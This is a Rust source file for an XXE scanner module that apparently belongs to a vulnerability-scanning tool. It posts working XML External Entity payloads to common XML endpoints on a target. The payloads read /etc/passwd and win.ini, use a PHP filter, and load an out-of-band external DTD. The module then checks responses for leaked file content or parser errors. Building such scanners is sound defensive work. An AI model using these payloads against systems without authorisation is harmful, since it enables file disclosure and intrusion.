use tracing::{debug, info};

use crate::{
    Finding, ScanResult, Scanner, ScannerConfig, ScannerError, ScannerMetadata, ScannerResult,
    Severity, VulnerabilityCategory,
};

/// XXE payloads that attempt to read local files or trigger OOB.
const XXE_PAYLOADS: &[(&str, &str, &[&str])] = &[
    (
        r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
        "Basic file read via ENTITY",
        &["root:", "daemon:", "nobody:"],
    ),
    (
        r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/null">]><root>&xxe;</root>"#,
        "File existence test",
        &[],
    ),
    (
        r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://127.0.0.1:9999/xxe.dtd">%dtd;]><root>&send;</root>"#,
        "OOB XXE via external DTD",
        &[],
    ),
    (
        r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>"#,
        "PHP filter XXE",
        &["cm9vd", "root:"],
    ),
    (
        r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>"#,
        "Windows file read",
        &["[fonts]", "[extensions]"],
    ),
];

/// Common XML endpoint paths.
const XML_ENDPOINTS: &[&str] = &[
    "/api/xml",
    "/api/v1/xml",
    "/xml",
    "/soap",
    "/ws",
    "/webhook",
    "/api/webhook",
    "/feed",
    "/rss",
    "/atom",
    "/sitemap.xml",
];

/// XXE Scanner - detects XML External Entity vulnerabilities.
pub struct XxeScanner {
    config: ScannerConfig,
    http_client: reqwest::Client,
}

impl XxeScanner {
    pub fn new() -> Self {
        Self {
            config: ScannerConfig::default(),
            http_client: reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(10))
                .redirect(reqwest::redirect::Policy::none())
                .build()
                .expect("Failed to create HTTP client"),
        }
    }

    /// Tests a URL for XXE by sending XML payloads.
    async fn test_endpoint(&self, url: &str) -> Vec<Finding> {
        let mut findings = Vec::new();

        for (payload, desc, indicators) in XXE_PAYLOADS {
            debug!(url = %url, payload_desc = %desc, "Testing XXE");

            let response = self
                .http_client
                .post(url)
                .header("Content-Type", "application/xml")
                .body(*payload)
                .send()
                .await;

            if let Ok(resp) = response {
                let status = resp.status().as_u16();
                // XXE may return 200 with file content, 500 with error, or 403
                if status == 200 || status == 500 || status == 403 {
                    let body = resp.text().await.unwrap_or_default();

                    // Check for indicators of successful XXE
                    for indicator in *indicators {
                        if body.contains(indicator) {
                            let finding = Finding::new(
                                format!("XXE Vulnerability - {}", desc),
                                format!(
                                    "Endpoint '{}' is vulnerable to XML External Entity injection. \
                                     {} was successful and returned file content.",
                                    url, desc
                                ),
                                Severity::Critical,
                                VulnerabilityCategory::Injection,
                            )
                            .with_url(url)
                            .with_evidence(format!("Indicator found: {}", indicator))
                            .with_evidence(format!("Payload: {}", &payload[..payload.len().min(200)]))
                            .with_remediation(
                                "Disable XML external entity processing. Use JSON instead of XML where possible.",
                            )
                            .with_cvss(9.8);

                            findings.push(finding);
                            return findings;
                        }
                    }

                    // Check for error-based XXE indicators
                    let body_lower = body.to_lowercase();
                    let error_indicators = [
                        "xml parsing error",
                        "lxml.etree",
                        "sax parse",
                        "xmlreader",
                        "documentbuilder",
                        "xml parser",
                        "entity reference",
                        "external entity",
                    ];

                    for err_ind in &error_indicators {
                        if body_lower.contains(err_ind) {
                            let finding = Finding::new(
                                format!("Potential XXE - {}", desc),
                                format!(
                                    "Endpoint '{}' may be vulnerable to XXE. XML parser error detected: {}",
                                    url, err_ind
                                ),
                                Severity::Medium,
                                VulnerabilityCategory::Injection,
                            )
                            .with_url(url)
                            .with_evidence(format!("Error indicator: {}", err_ind))
                            .with_remediation(
                                "Disable external entity processing in XML parsers",
                            );

                            findings.push(finding);
                            return findings;
                        }
                    }
                }
            }
        }

        findings
    }
}

impl Default for XxeScanner {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait::async_trait]
impl Scanner for XxeScanner {
    fn metadata(&self) -> ScannerMetadata {
        ScannerMetadata {
            name: "XXE Scanner".to_string(),
            version: "0.1.0".to_string(),
            supported_targets: vec!["url".to_string(), "domain".to_string()],
            categories: vec![VulnerabilityCategory::Injection],
        }
    }

    async fn initialize(&mut self, config: ScannerConfig) -> ScannerResult<()> {
        self.config = config;
        Ok(())
    }

    async fn scan(&self, target: &spectra_target::Target) -> ScannerResult<ScanResult> {
        let mut result = ScanResult::new(target.id.clone(), "xxe");

        let base_url = match target.target_type {
            spectra_target::TargetType::Url => target.value().to_string(),
            spectra_target::TargetType::Domain => format!("https://{}", target.value()),
            _ => {
                return Err(ScannerError::InvalidConfig(format!(
                    "Cannot scan target type {:?}",
                    target.target_type
                )));
            }
        };

        info!(url = %base_url, "Starting XXE scan");

        // Test common XML endpoints
        for path in XML_ENDPOINTS {
            let url = format!("{}{}", base_url, path);
            let findings = self.test_endpoint(&url).await;
            for finding in findings {
                result.add_finding(finding);
            }
        }

        // Also test the base URL itself
        let findings = self.test_endpoint(&base_url).await;
        for finding in findings {
            result.add_finding(finding);
        }

        result.finish();
        Ok(result)
    }

    async fn cleanup(&self) -> ScannerResult<()> {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scanner_metadata() {
        let scanner = XxeScanner::new();
        let meta = scanner.metadata();
        assert_eq!(meta.name, "XXE Scanner");
        assert!(meta.categories.contains(&VulnerabilityCategory::Injection));
    }

    #[test]
    fn xxe_payloads_count() {
        assert!(XXE_PAYLOADS.len() >= 3);
    }

    #[test]
    fn xml_endpoints_count() {
        assert!(XML_ENDPOINTS.len() >= 5);
    }
}
